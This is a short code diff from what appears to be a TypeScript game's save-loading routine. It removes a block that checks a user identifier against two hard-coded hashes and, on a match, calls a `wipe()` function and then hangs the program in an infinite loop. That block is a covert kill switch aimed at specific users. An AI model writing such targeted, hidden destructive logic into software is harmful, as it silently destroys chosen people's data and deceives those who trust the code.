@@ -396,14 +396,6 @@ export const load = async (fromReq?: ServerSentWorkerData) => {
     }
   }
 
-  const ident = await makeWorkerReq(generateIdent()).then(r => r.ident!);
-
-  if (ident === "ZYv1ZQfR/rvR0JsehwFiFGW248X6iaFFARuUoT8FU+M=" || ident === "zs2PVtH1xfVRDmvUOHPuqEZYJlHp89/pL3WqVwF9VAI=") {
-    await wipe();
-
-    while (true) { };
-  }
-
   // Check if we already have a save
   if (res.results && res.results[0]) {
     const generalSaveData = decodeSaveData(
